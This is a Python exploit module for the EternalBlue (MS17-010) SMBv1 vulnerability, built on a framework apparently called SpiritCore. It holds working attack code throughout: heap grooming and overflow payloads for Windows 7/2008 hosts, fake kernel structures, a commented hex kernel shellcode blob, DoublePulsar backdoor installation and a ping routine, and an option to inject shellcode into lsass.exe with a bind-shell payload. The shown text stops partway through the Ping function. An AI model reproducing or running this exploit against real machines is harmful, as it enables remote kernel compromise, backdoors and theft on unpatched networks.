#!/usr/bin/python

from posixpath import expanduser
import re
from SpiritCore.Modules import *
from SpiritCore.Payload import *
from SpiritCore.System import *
from SpiritCore.Session import *
from struct import pack,unpack
from impacket import smb
import sys,binascii,socket,datetime,random,uuid

'''
EternalBlue exploit for Windows 7/2008 by sleepya
The exploit might FAIL and CRASH a target system (depended on what is overwritten)

EDB Note: Shellcode
- x64 ~ https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/42030.asm
- x86 ~ https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/42031.asm

Tested on:
- Windows 7 SP1 x64
- Windows 2008 R2 SP1 x64
- Windows 7 SP1 x86
- Windows 2008 SP1 x64
- Windows 2008 SP1 x86

Reference:
- http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/


Bug detail:
- For the buffer overflow bug detail, please see http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/
- The exploit also use other 2 bugs (see details in BUG.txt)
  - Send a large transaction with SMB_COM_NT_TRANSACT but processed as SMB_COM_TRANSACTION2 (requires for trigger bug)
  - Send special session setup command (SMB login command) to allocate big nonpaged pool (use for creating hole)
######


Exploit info:
- I do not reverse engineer any x86 binary so I do not know about exact offset.
- The exploit use heap of HAL (address 0xffffffffffd00010 on x64) for placing fake struct and shellcode.
  This memory page is executable on Windows 7 and Wndows 2008.
- The important part of feaList and fakeStruct is copied from NSA exploit which works on both x86 and x64.
- The exploit trick is same as NSA exploit
- The overflow is happened on nonpaged pool so we need to massage target nonpaged pool.
- If exploit failed but target does not crash, try increasing 'numGroomConn' value (at least 5)
- See the code and comment for exploit detail.


srvnet buffer info:
- srvnet buffer contains a pointer to another struct and MDL about received buffer
  - Controlling MDL values results in arbitrary write
  - Controlling pointer to fake struct results in code execution because there is pointer to function
- A srvnet buffer is created after target receiving first 4 bytes
  - First 4 bytes contains length of SMB message
  - The possible srvnet buffer size is "..., 0x9000, 0x11000, 0x21000, ...". srvnet.sys will select the size that big enough.
- After receiving whole SMB message or connection lost, server call SrvNetWskReceiveComplete() to handle SMB message
- SrvNetWskReceiveComplete() check and set some value then pass SMB message to SrvNetCommonReceiveHandler()
- SrvNetCommonReceiveHandler() passes SMB message to SMB handler
  - If a pointer in srvnet buffer is modified to fake struct, we can make SrvNetCommonReceiveHandler() call our shellcode
  - If SrvNetCommonReceiveHandler() call our shellcode, no SMB handler is called
  - Normally, SMB handler free the srvnet buffer when done but our shellcode dose not. So memory leak happen.
  - Memory leak is ok to be ignored


Shellcode note:
- Shellcode is executed in kernel mode (ring 0) and IRQL is DISPATCH_LEVEL
- Hijacking system call is common method for getting code execution in Process context (IRQL is PASSIVE_LEVEL)
  - On Windows x64, System call target address can be modified by writing to IA32_LSTAR MSR (0xc0000082)
  - IA32_LSTAR MSR scope is core/thread/unique depended on CPU model
  - On idle target with multiple core processors, the hijacked system call might take a while (> 5 minutes) to 
      get call because it is called on other processors
  - Shellcode should be aware of double overwriting system call target address when using hijacking system call method
- Then, using APC in Process context to get code execution in userland (ring 3)

#E-DB Note: https://gist.github.com/worawit/bd04bad3cd231474763b873df081c09a
#E-DB Note: https://github.com/worawit/MS17-010/blob/eafb47d715fe38045c9ea6dc4cb75ca0ef5487ce/eternalblue_exploit7.py
'''

# Note: see how to craft FEALIST in eternalblue_poc.py

# wanted overflown buffer size (this exploit support only 0x10000 and 0x11000)
# the size 0x10000 is easier to debug when setting breakpoint in SrvOs2FeaToNt() because it is called only 2 time
# the size 0x11000 is used in nsa exploit. this size is more reliable.
NTFEA_SIZE = 0x11000
# the NTFEA_SIZE above is page size. We need to use most of last page preventing any data at the end of last page

ntfea10000 = pack(b'<BBH', 0, 0, 0xffdd) +b'A'*0xffde

ntfea11000 = (pack(b'<BBH', 0, 0, 0) + b'\x00')*600  # with these fea, ntfea size is 0x1c20
ntfea11000 += pack(b'<BBH', 0, 0, 0xf3bd) + b'A'*0xf3be  # 0x10fe8 - 0x1c20 - 0xc = 0xf3bc
ntfea1f000 = (pack(b'<BBH', 0, 0, 0) + b'\x00')*0x2494  # with these fea, ntfea size is 0x1b6f0
ntfea1f000 += pack(b'<BBH', 0, 0, 0x48ed) + b'A'*0x48ee  # 0x1ffe8 - 0x1b6f0 - 0xc = 0x48ec

ntfea = { 0x10000 : ntfea10000, 0x11000 : ntfea11000 }

'''
Reverse from srvnet.sys (Win7 x64)
- SrvNetAllocateNonPagedBufferInternal() and SrvNetWskReceiveComplete():

// for x64
struct SRVNET_BUFFER {
    // offset from POOLHDR: 0x10
    USHORT flag;
    char pad[2];
    char unknown0[12];
    // offset from SRVNET_POOLHDR: 0x20
    LIST_ENTRY list;
    // offset from SRVNET_POOLHDR: 0x30
    char *pnetBuffer;
    DWORD netbufSize;  // size of netBuffer
    DWORD ioStatusInfo;  // copy value of IRP.IOStatus.Information
    // offset from SRVNET_POOLHDR: 0x40
    MDL *pMdl1; // at offset 0x70
    DWORD nByteProcessed;
    DWORD pad3;
    // offset from SRVNET_POOLHDR: 0x50
    DWORD nbssSize;  // size of this smb packet (from user)
    DWORD pad4;
    QWORD pSrvNetWskStruct;  // want to change to fake struct address
    // offset from SRVNET_POOLHDR: 0x60
    MDL *pMdl2;
    QWORD unknown5;
    // offset from SRVNET_POOLHDR: 0x70
    // MDL mdl1;  // for this srvnetBuffer (so its pointer is srvnetBuffer address)
    // MDL mdl2;
    // char transportHeader[0x50];  // 0x50 is TRANSPORT_HEADER_SIZE
    // char netBuffer[0];
};

struct SRVNET_POOLHDR {
    DWORD size;
    char unknown[12];
    SRVNET_BUFFER hdr;
};
'''
# Most field in overwritten (corrupted) srvnet struct can be any value because it will be left without free (memory leak) after processing
# Here is the important fields on x64
# - offset 0x58 (VOID*) : pointer to a struct contained pointer to function. the pointer to function is called when done receiving SMB request.
#                           The value MUST point to valid (might be fake) struct.
# - offset 0x70 (MDL)   : MDL for describe receiving SMB request buffer
#   - 0x70 (VOID*)    : MDL.Next should be NULL
#   - 0x78 (USHORT)   : MDL.Size should be some value that not too small
#   - 0x7a (USHORT)   : MDL.MdlFlags should be 0x1004 (MDL_NETWORK_HEADER|MDL_SOURCE_IS_NONPAGED_POOL)
#   - 0x80 (VOID*)    : MDL.Process should be NULL
#   - 0x88 (VOID*)    : MDL.MappedSystemVa MUST be a received network buffer address. Controlling this value get arbitrary write.
#                         The address for arbitrary write MUST be subtracted by a number of sent bytes (0x80 in this exploit).
#                         
#
# To free the corrupted srvnet buffer, shellcode MUST modify some memory value to satisfy condition.
# Here is related field for freeing corrupted buffer
# - offset 0x10 (USHORT): be 0xffff to make SrvNetFreeBuffer() really free the buffer (else buffer is pushed to srvnet lookaside)
#                           a corrupted buffer MUST not be reused.
# - offset 0x48 (DWORD) : be a number of total byte received. This field MUST be set by shellcode because SrvNetWskReceiveComplete() set it to 0
#                           before calling SrvNetCommonReceiveHandler(). This is possible because pointer to SRVNET_BUFFER struct is passed to
#                           your shellcode as function argument
# - offset 0x60 (PMDL)  : points to any fake MDL with MDL.Flags 0x20 does not set
# The last condition is your shellcode MUST return non-negative value. The easiest way to do is "xor eax,eax" before "ret".
# Here is x64 assembly code for setting nByteProcessed field
# - fetch SRVNET_BUFFER address from function argument
#     \x48\x8b\x54\x24\x40  mov rdx, [rsp+0x40]
# - set nByteProcessed for trigger free after return
#     \x8b\x4a\x2c          mov ecx, [rdx+0x2c]
#     \x89\x4a\x38          mov [rdx+0x38], ecx
TARGET_HAL_HEAP_ADDR_x64 = 0xffffffffffd00010
TARGET_HAL_HEAP_ADDR_x86 = 0xffdff000

fakeSrvNetBufferNsa = pack('<II', 0x11000, 0)*2
fakeSrvNetBufferNsa += pack('<HHI', 0xffff, 0, 0)*2
fakeSrvNetBufferNsa += b'\x00'*16
fakeSrvNetBufferNsa += pack('<IIII', TARGET_HAL_HEAP_ADDR_x86+0x100, 0, 0, TARGET_HAL_HEAP_ADDR_x86+0x20)
fakeSrvNetBufferNsa += pack('<IIHHI', TARGET_HAL_HEAP_ADDR_x86+0x100, 0, 0x60, 0x1004, 0)  # _, x86 MDL.Next, .Size, .MdlFlags, .Process
fakeSrvNetBufferNsa += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86-0x80, 0, TARGET_HAL_HEAP_ADDR_x64)  # x86 MDL.MappedSystemVa, _, x64 pointer to fake struct
fakeSrvNetBufferNsa += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0x100, 0)  # x64 pmdl2
# below 0x20 bytes is overwritting MDL
# NSA exploit overwrite StartVa, ByteCount, ByteOffset fields but I think no need because ByteCount is always big enough
fakeSrvNetBufferNsa += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
fakeSrvNetBufferNsa += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64-0x80)  # MDL.Process, MDL.MappedSystemVa

# below is for targeting x64 only (all x86 related values are set to 0)
# this is for show what fields need to be modified
fakeSrvNetBufferX64 = pack('<II', 0x11000, 0)*2
fakeSrvNetBufferX64 += pack('<HHIQ', 0xffff, 0, 0, 0)
fakeSrvNetBufferX64 += b'\x00'*16
fakeSrvNetBufferX64 += b'\x00'*16
fakeSrvNetBufferX64 += b'\x00'*16  # 0x40
fakeSrvNetBufferX64 += pack('<IIQ', 0, 0, TARGET_HAL_HEAP_ADDR_x64)  # _, _, pointer to fake struct
fakeSrvNetBufferX64 += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0x100, 0)  # pmdl2
fakeSrvNetBufferX64 += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
fakeSrvNetBufferX64 += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64-0x80)  # MDL.Process, MDL.MappedSystemVa


fakeSrvNetBuffer = fakeSrvNetBufferNsa
#fakeSrvNetBuffer = fakeSrvNetBufferX64

feaList = pack('<I', 0x10000)  # the value of feaList size MUST be >=0x10000 to trigger bug (but must be less than data size)
feaList += ntfea[NTFEA_SIZE]
# Note:
# - SMB1 data buffer header is 16 bytes and 8 bytes on x64 and x86 respectively
#   - x64: below fea will be copy to offset 0x11000 of overflow buffer
#   - x86: below fea will be copy to offset 0x10ff8 of overflow buffer
feaList += pack('<BBH', 0, 0, len(fakeSrvNetBuffer)-1) + fakeSrvNetBuffer # -1 because first '\x00' is for name
# stop copying by invalid flag (can be any value except 0 and 0x80)
feaList += pack('<BBH', 0x12, 0x34, 0x5678)


# fake struct for SrvNetWskReceiveComplete() and SrvNetCommonReceiveHandler()
# x64: fake struct is at ffffffff ffd00010
#   offset 0xa0:  LIST_ENTRY must be valid address. cannot be NULL.
#   offset 0x08:  set to 3 (DWORD) for invoking ptr to function
#   offset 0x1d0: KSPIN_LOCK
#   offset 0x1d8: array of pointer to function
#
# code path to get code exection after this struct is controlled
# SrvNetWskReceiveComplete() -> SrvNetCommonReceiveHandler() -> call fn_ptr
fake_recv_struct = pack('<QII', 0, 3, 0)
fake_recv_struct += b'\x00'*16
fake_recv_struct += pack('<QII', 0, 3, 0)
fake_recv_struct += (b'\x00'*16)*7
fake_recv_struct += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0xa0, TARGET_HAL_HEAP_ADDR_x64+0xa0)  # offset 0xa0 (LIST_ENTRY to itself)
fake_recv_struct += b'\x00'*16
fake_recv_struct += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86+0xc0, TARGET_HAL_HEAP_ADDR_x86+0xc0, 0)  # x86 LIST_ENTRY
fake_recv_struct += (b'\x00'*16)*11
fake_recv_struct += pack('<QII', 0, 0, TARGET_HAL_HEAP_ADDR_x86+0x190)  # fn_ptr array on x86
fake_recv_struct += pack('<IIQ', 0, TARGET_HAL_HEAP_ADDR_x86+0x1f0-1, 0)  # x86 shellcode address
fake_recv_struct += (b'\x00'*16)*3
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64+0x1e0)  # offset 0x1d0: KSPINLOCK, fn_ptr array
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64+0x1f0-1)  # x64 shellcode address - 1 (this value will be increment by one)

RetMid = {
"0":"NotDetected",
"16":"Success",
"32":"InvalidParams",
"48":"AllocFailure"
  }

MidStaue = {
"NotDetected":"0",
"Success":"10",
"InvalidParams":"20",
"AllocFailure":"30"
  }
def getNTStatus(self):
    return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)

def sendEcho(conn, tid, data):
    pkt = smb.NewSMBPacket()
    pkt['Tid'] = tid

    transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)
    transCommand['Parameters'] = smb.SMBEcho_Parameters()
    transCommand['Data'] = smb.SMBEcho_Data()

    transCommand['Parameters']['EchoCount'] = 1
    transCommand['Data']['Data'] = data
    pkt.addCommand(transCommand)

    conn.sendSMB(pkt)
    recvPkt = conn.recvSMB()
    if recvPkt.getNTStatus() == 0:
        write('got good ECHO response')
    else:
        write('got bad ECHO response: 0x{:x}'.format(recvPkt.getNTStatus()))


def createSessionAllocNonPaged(target, size):
    # There is a bug in SMB_COM_SESSION_SETUP_ANDX command that allow us to allocate a big nonpaged pool.
    # The big nonpaged pool allocation is in BlockingSessionSetupAndX() function for storing NativeOS and NativeLanMan.
    # The NativeOS and NativeLanMan size is caculated from "ByteCount - other_data_size"
    
    # Normally a server validate WordCount and ByteCount field in SrvValidateSmb() function. They must not be larger than received data. 
    # For "NT LM 0.12" dialect, There are 2 possible packet format for SMB_COM_SESSION_SETUP_ANDX command.
    # - https://msdn.microsoft.com/en-us/library/ee441849.aspx for LM and NTLM authentication
    #   - GetNtSecurityParameters() function is resposible for extracting data from this packet format
    # - https://msdn.microsoft.com/en-us/library/cc246328.aspx for NTLMv2 (NTLM SSP) authentication
    #   - GetExtendSecurityParameters() function is resposible for extracting data from this packet format
    
    # These 2 formats have different WordCount (first one is 13 and later is 12). 
    # Here is logic in BlockingSessionSetupAndX() related to this bug
    # - check WordCount for both formats (the CAP_EXTENDED_SECURITY must be set for extended security format)
    # - if FLAGS2_EXTENDED_SECURITY and CAP_EXTENDED_SECURITY are set, process a message as Extend Security request
    # - else, process a message as NT Security request
    
    # So we can send one format but server processes it as another format by controlling FLAGS2_EXTENDED_SECURITY and CAP_EXTENDED_SECURITY.
    # With this confusion, server read a ByteCount from wrong offset to calculating "NativeOS and NativeLanMan size".
    # But GetExtendSecurityParameters() checks ByteCount value again.
    
    # So the only possible request to use the bug is sending Extended Security request but does not set FLAGS2_EXTENDED_SECURITY.
    
    conn = smb.SMB(target, target)
    _, flags2 = conn.get_flags()
    # FLAGS2_EXTENDED_SECURITY MUST not be set
    flags2 &= ~smb.SMB.FLAGS2_EXTENDED_SECURITY
    # if not use unicode, buffer size on target machine is doubled because converting ascii to utf16
    if size >= 0xffff:
        flags2 &= ~smb.SMB.FLAGS2_UNICODE
        reqSize = size // 2
    else:
        flags2 |= smb.SMB.FLAGS2_UNICODE
        reqSize = size
    conn.set_flags(flags2=flags2)
    
    pkt = smb.NewSMBPacket()

    sessionSetup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
    sessionSetup['Parameters'] = smb.SMBSessionSetupAndX_Extended_Parameters()

    sessionSetup['Parameters']['MaxBufferSize']      = 61440  # can be any value greater than response size
    sessionSetup['Parameters']['MaxMpxCount']        = 2  # can by any value
    sessionSetup['Parameters']['VcNumber']           = 2  # any non-zero
    sessionSetup['Parameters']['SessionKey']         = 0
    sessionSetup['Parameters']['SecurityBlobLength'] = 0  # this is OEMPasswordLen field in another format. 0 for NULL session
    # UnicodePasswordLen field is in Reserved for extended security format. 0 for NULL session
    sessionSetup['Parameters']['Capabilities']       = smb.SMB.CAP_EXTENDED_SECURITY  # can add other flags

    sessionSetup['Data'] = pack('<H', reqSize) + b'\x00'*20
    pkt.addCommand(sessionSetup)
    print_msg("Starting non-paged pool grooming")
    conn.sendSMB(pkt)
    recvPkt = conn.recvSMB()
    if recvPkt.getNTStatus() == 0:
        pass
        #write('SMB1 session setup allocate nonpaged pool success')
    else:
        write('SMB1 session setup allocate nonpaged pool failed')
    return conn


# Note: impacket-0.9.15 struct has no ParameterDisplacement
############# SMB_COM_TRANSACTION2_SECONDARY (0x33)
class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
    structure = (
        ('TotalParameterCount','<H=0'),
        ('TotalDataCount','<H'),
        ('ParameterCount','<H=0'),
        ('ParameterOffset','<H=0'),
        ('ParameterDisplacement','<H=0'),
        ('DataCount','<H'),
        ('DataOffset','<H'),
        ('DataDisplacement','<H=0'),
        ('FID','<H=0'),
    )

def send_trans2_second(conn, tid, data, displacement):
    pkt = smb.NewSMBPacket()
    pkt['Tid'] = tid

    # assume no params

    transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
    transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
    transCommand['Data'] = smb.SMBTransaction2Secondary_Data()

    transCommand['Parameters']['TotalParameterCount'] = 0
    transCommand['Parameters']['TotalDataCount'] = len(data)

    fixedOffset = 32+3+18
    transCommand['Data']['Pad1'] = b''

    transCommand['Parameters']['ParameterCount'] = 0
    transCommand['Parameters']['ParameterOffset'] = 0

    if len(data) > 0:
        pad2Len = (4 - fixedOffset % 4) % 4
        transCommand['Data']['Pad2'] = b'\xFF' * pad2Len
    else:
        transCommand['Data']['Pad2'] = b''
        pad2Len = 0

    transCommand['Parameters']['DataCount'] = len(data)
    transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
    transCommand['Parameters']['DataDisplacement'] = displacement

    transCommand['Data']['Trans_Parameters'] = b''
    transCommand['Data']['Trans_Data'] = data
    pkt.addCommand(transCommand)

    conn.sendSMB(pkt)


def send_big_trans2(conn, tid, setup, data, param, firstDataFragmentSize, sendLastChunk=True):
    # Here is another bug in MS17-010.
    # To call transaction subcommand, normally a client need to use correct SMB commands as documented in
    #   https://msdn.microsoft.com/en-us/library/ee441514.aspx
    # If a transaction message is larger than SMB message (MaxBufferSize in session parameter), a client 
    #   can use *_SECONDARY command to send transaction message. When sending a transaction completely with
    #   *_SECONDARY command, a server uses the last command that complete the transaction.
    # For example:
    # - if last command is SMB_COM_NT_TRANSACT_SECONDARY, a server executes subcommand as NT_TRANSACT_*.
    # - if last command is SMB_COM_TRANSACTION2_SECONDARY, a server executes subcommand as TRANS2_*.
    #
    # Without MS17-010 patch, a client can mix a transaction command if TID, PID, UID, MID are the same.
    # For example:
    # - a client start transaction with SMB_COM_NT_TRANSACT command
    # - a client send more transaction data with SMB_COM_NT_TRANSACT_SECONDARY and SMB_COM_TRANSACTION2_SECONDARY
    # - a client sned last transactino data with SMB_COM_TRANSACTION2_SECONDARY
    # - a server executes transaction subcommand as TRANS2_* (first 2 bytes of Setup field)
    
    # From https://msdn.microsoft.com/en-us/library/ee442192.aspx, a maximum data size for sending a transaction 
    #   with SMB_COM_TRANSACTION2 is 65535 because TotalDataCount field is USHORT
    # While a maximum data size for sending a transaction with SMB_COM_NT_TRANSACT is >65536 because TotalDataCount
    #   field is ULONG (see https://msdn.microsoft.com/en-us/library/ee441534.aspx).
    # Note: a server limit SetupCount+TotalParameterCount+TotalDataCount to 0x10400 (in SrvAllocationTransaction)
    
    pkt = smb.NewSMBPacket()
    pkt['Tid'] = tid

    command = pack('<H', setup)
    
    # Use SMB_COM_NT_TRANSACT because we need to send data >65535 bytes to trigger the bug.
    transCommand = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
    transCommand['Parameters'] = smb.SMBNTTransaction_Parameters()
    transCommand['Parameters']['MaxSetupCount'] = 1
    transCommand['Parameters']['MaxParameterCount'] = len(param)
    transCommand['Parameters']['MaxDataCount'] = 0
    transCommand['Data'] = smb.SMBTransaction2_Data()

    transCommand['Parameters']['Setup'] = command
    transCommand['Parameters']['TotalParameterCount'] = len(param)
    transCommand['Parameters']['TotalDataCount'] = len(data)

    fixedOffset = 32+3+38 + len(command)
    if len(param) > 0:
        padLen = (4 - fixedOffset % 4 ) % 4
        padBytes = b'\xFF' * padLen
        transCommand['Data']['Pad1'] = padBytes
    else:
        transCommand['Data']['Pad1'] = b''
        padLen = 0

    transCommand['Parameters']['ParameterCount'] = len(param)
    transCommand['Parameters']['ParameterOffset'] = fixedOffset + padLen

    if len(data) > 0:
        pad2Len = (4 - (fixedOffset + padLen + len(param)) % 4) % 4
        transCommand['Data']['Pad2'] = b'\xFF' * pad2Len
    else:
        transCommand['Data']['Pad2'] = b''
        pad2Len = 0

    transCommand['Parameters']['DataCount'] = firstDataFragmentSize
    transCommand['Parameters']['DataOffset'] = transCommand['Parameters']['ParameterOffset'] + len(param) + pad2Len

    transCommand['Data']['Trans_Parameters'] = param
    transCommand['Data']['Trans_Data'] = data[:firstDataFragmentSize]
    pkt.addCommand(transCommand)

    conn.sendSMB(pkt)
    conn.recvSMB() # must be success
    
    # Then, use SMB_COM_TRANSACTION2_SECONDARY for send more data
    i = firstDataFragmentSize
    while i < len(data):
        # limit data to 4096 bytes per SMB message because this size can be used for all Windows version
        sendSize = min(4096, len(data) - i)
        if len(data) - i <= 4096:
            if not sendLastChunk:
                break
        send_trans2_second(conn, tid, data[i:i+sendSize], i)
        i += sendSize
    
    if sendLastChunk:
        conn.recvSMB()
    return i

    
# connect to target and send a large nbss size with data 0x80 bytes
# this method is for allocating big nonpaged pool (no need to be same size as overflow buffer) on target
# a nonpaged pool is allocated by srvnet.sys that started by useful struct (especially after overwritten)
def createConnectionWithBigSMBFirst80(target):
    # https://msdn.microsoft.com/en-us/library/cc246496.aspx
    # Above link is about SMB2, but the important here is first 4 bytes.
    # If using wireshark, you will see the StreamProtocolLength is NBSS length.
    # The first 4 bytes is same for all SMB version. It is used for determine the SMB message length.
    #
    # After received first 4 bytes, srvnet.sys allocate nonpaged pool for receving SMB message.
    # srvnet.sys forwards this buffer to SMB message handler after receiving all SMB message.
    # Note: For Windows 7 and Windows 2008, srvnet.sys also forwards the SMB message to its handler when connection lost too.
    sk = socket.create_connection((target, 445))
    # For this exploit, use size is 0x11000
    pkt = b'\x00' + b'\x00' + pack('>H', 0xfff7)
    # There is no need to be SMB2 because we got code execution by corrupted srvnet buffer.
    # Also this is invalid SMB2 message.
    # I believe NSA exploit use SMB2 for hiding alert from IDS
    #pkt += '\xfeSMB' # smb2
    # it can be anything even it is invalid
    pkt += b'BAAD' # can be any
    pkt += b'\x00'*0x7c
    sk.send(pkt)
    return sk
def CalcDoublepulsaXokey(s):
    """Calaculate Doublepulsar Xor Key
    """
    x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
    x = x & 0xffffffff  # this line was added just to truncate to 32 bits
    return x

def DouCalParame(Type,Data,key):
    if Type == 1 or Type==2:
        return b"\x00"*12
def MakeSmbTrans2DoublepulsarPing(SmbSession,TreeID,Type,body=b""):
    MultiplexID=random.randint(0x0000,0xffff)
    DopuParame=DouCalParame(1,body,None)
    #write("s")
    Payload = b"%s%s"%(DopuParame,body)
    SetupData=b"\x0e\x00"
    base_offset = 67 + (1 * 2) - 4
    param_offset = base_offset
    data_offset = param_offset + len(DopuParame)
    #write("s")
    Smb2_Session= smb.NewSMBPacket()
    Smb2_Session["Flags1"]=0x18
    Smb2_Session["Tid"]=TreeID
    Smb2_Session["Flags2"]=0xc007
    Smb2_Session["Mid"]=MultiplexID
    Trans2Parameate = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2)
    RespData= smb.SMBTransaction2Response_Data()
    Trans2Parameate['Parameters'] = smb.SMBTransaction2_Parameters()
    Trans2Parameate['Parameters']['Setup'] = pack("H",0x000e)
    Trans2Parameate["Parameters"]["TotalParameterCount"]=len(DopuParame)
    Trans2Parameate["Parameters"]["MaxDataCount"]=0
    Trans2Parameate["Parameters"]["MaxParameterCount"]=1
    Trans2Parameate["Parameters"]["TotalDataCount"]=len(str(body))
    Trans2Parameate["Parameters"]["ParameterOffset"]=param_offset
    Trans2Parameate["Parameters"]["SetupCount"]=1
    Trans2Parameate["Parameters"]["DataCount"]=len(str(body))
    Trans2Parameate["Parameters"]["ParameterCount"]=len(DopuParame)
    Trans2Parameate["Parameters"]["DataOffset"]=data_offset
    Trans2Parameate["Parameters"]["Timeout"]=0x00ce361f
    RespData['Trans_ParametersLength']=len(DopuParame)
    RespData['Trans_DataLength']= Trans2Parameate["Parameters"]['DataCount']
    setup=b"1"
    #write("s")
    padLen=0
    if len(DopuParame) > 0:
        padLen = (4 - (55 + len(setup)) % 4 ) % 4
        padBytes = b'\xFF' * padLen
        RespData['Pad1'] = padBytes
    else:

        padLen = 0
        RespData['Pad1'] = b''
    if len(str(body)) > 0:
        #pad2Len = 4 - (55 + len(setup) + padLen + len(parameters)) % 4
        pad2Len = (4 - (55 + len(setup) + padLen + len(DopuParame)) % 4) % 4
        RespData['Pad2'] = b'\xFF' * pad2Len+b"0x00"
    else:
        RespData['Pad2']= '\x00'
    RespData['Trans_Parameters'] = DopuParame[:Trans2Parameate["Parameters"]['ParameterCount']]
    RespData['Trans_Data']       = DopuParame[:Trans2Parameate["Parameters"]['DataCount']]
    Trans2Parameate['Data'] =RespData
    #Trans2Parameate["Parameters"]["Payload"]=Payload
    Smb2_Session.addCommand(Trans2Parameate)
    SmbSession.sendSMB(Smb2_Session)
    HanderSmb=SmbSession.recvSMB()
    SecurityFeatures=HanderSmb["SecurityFeatures"][:4]
    RetMultiplexID=HanderSmb["Mid"]
    #write("s")
    SmbSign = unpack("<I",SecurityFeatures)[0]
    IKey = CalcDoublepulsaXokey(SmbSign)
    XorKey=pack("<I",IKey)
    if HanderSmb["SecurityFeatures"][4:5] == b"\x01":
        Arch="x64 (64-bit)"
    else:
        Arch="x86 (32-bit)"
    Staut=RetMultiplexID-MultiplexID
    return XorKey,Arch,Staut,MultiplexID


target=['Windows 7','Windows Embedded Standard 7','Windows Server 2008 R2','Windows 8','Windows 8.1','Windows Server 2012','Windows Pro Build','Windows 10 Enterprise Evaluation Build']
def verify_target(OS):
    for os in target:
        if os in OS:
            return True
    return False
def hexstring(s):
    s+= b"0"*(32-len(s))
    rbytes = b''
    for i in range(0, len(s), 2):
        hx = s[i:i+2]
        rbytes += hx+b" "
    #write(rbytes)
    return rbytes


class Module(Modules):
    Info={
        "Name":"MS17-010 EternalBlue",
        "Author":"ZSD",
        "Description":"Microsoft Windows SMBv1 SMBv2 MS17-010 Exploit ",
        "Options":(
            ("TargetIp","192.168.0.108",True,'Target IP Address'),
            ("Architecture","x64",True,"Operating System, Service Pack, and Architecture of target OS",["x64","x86"]),
            ("Protocol","SMB",False,"Protocol for the backdoor to speak SMB and RDP"),
            ("VerifyTarget","True",False,"Verify Target System Version",["True","False"]),
            ("InstallDoublePulasr","True",False,"Install DoublePulasr (use DoublePulasr SHELLCODE)",["True","False"]),
            ("ProcessName","lsass.exe",False,"Ring3 ShellCode Inject Target Process"),
            ),
        "Payload": ["windows/bind_shell_tcp", "Windows Ring3 ShellCode"],

    }
    def MakeShellCode(self):
        #   ShellCode Inject to LSASS.EXE of Process Exception Reboot
        #    ProcessName explorer test

        #Kernel_ShellCode=str(binascii.a2b_hex("55e82e000000b9820000c00f324c8d0d340000004439c87419394500740a895504894500c645f8004991505a48c1ea200f305dc3488d2d0010000048c1ed0c48c1e50c4883ed70c30f01f865488924251000000065488b2425a80100006a2b65ff342510000000505055e8c5ffffff488b45004883c01f48894424105152415041514152415331c0b201f00fb055f87514b9820000c08b45008b55040f30fbe80e000000fa415b415a415941585a595d58c341574156575653504c8b7d0049c1ef0c49c1e70c4981ef001000006641813f4d5a75f14c897d08654c8b342588010000bf787cf4dbe8010100004891bf3f5f6477e8fc0000008b400389c33d00040000720383c010488d50284c8d04114d89c14d8b094d39c80f84c60000004c89c84c29f0483d0007000077e64d29cebfe1140117e8bb0000008b780383c708488d3419e8f40000003d5a6afac174103dd883e03e7409488b0c394829f9ebe0bf48b818b8e884000000488945f0488d34114889f3488b5b084839de74f74a8d1433bf3e4cf8cee8690000008b400348837c02f80074de488d4d104d31c04c8d0da9000000556a015541504883ec20bfc45c196de835000000488d4d104d31c9bf3446ccafe8240000004883c44085c074a3488b452080781a01740948890048894008eb90585b5e5f415e415fc3e802000000ffe0535156418b473c418b8407880000004c01f8508b48188b58204c01fbffc98b348b4c01fee81f00000039f875ef588b58244c01fb668b0c4b8b581c4c01fb8b048b4c01f85e595bc35231c099acc1ca0d01c285c075f6925ac3555357564157498b284c8b7d08525e4c89cb31c0440f22c048890289c148f7d14989c0b04050c1e006504989014883ec20bfea996e57e865ffffff4883c43085c07545488b3e488d354d000000b900060000f3a4488b45f0488b4018488b4020488b00668378481875f6488b5050817a0c3300320075e94c8b7820bf5e515e83e822ffffff48890331c9884df8b101440f22c1415f5e5f5b5dc3489231c951514989c94c8d050d00000089ca4883ec20ffd04883c430c3"))
        if self.Parameate['InstallDoublePulasr']=="True":
            return open("SpiritCore/Lib/Lib/Windows/InstallDoublePulasr.bin","rb").read()
        #Kernel_ShellCode = "\xcc"
        SCO=ShellCode(self.Object,self.Object.UsePayloadObject.Name,self.Parameate)
        User_ShellCode = SCO.raw_shellcode()
        Kernel_ShellCode = SCO.Ring0ApcInjectRing3Shellcode(self.Parameate['ProcessName'],self.Parameate['Architecture'])
        #write(Kernel_ShellCode)
        return Kernel_ShellCode+User_ShellCode
    def Ping(self):
        TargetIp=self.Parameate["TargetIp"]
        print_msg("Selected Protocol SMB")

        print_msg("Connecting to target...")
        try:
            SmbSession = smb.SMB(TargetIp, TargetIp)
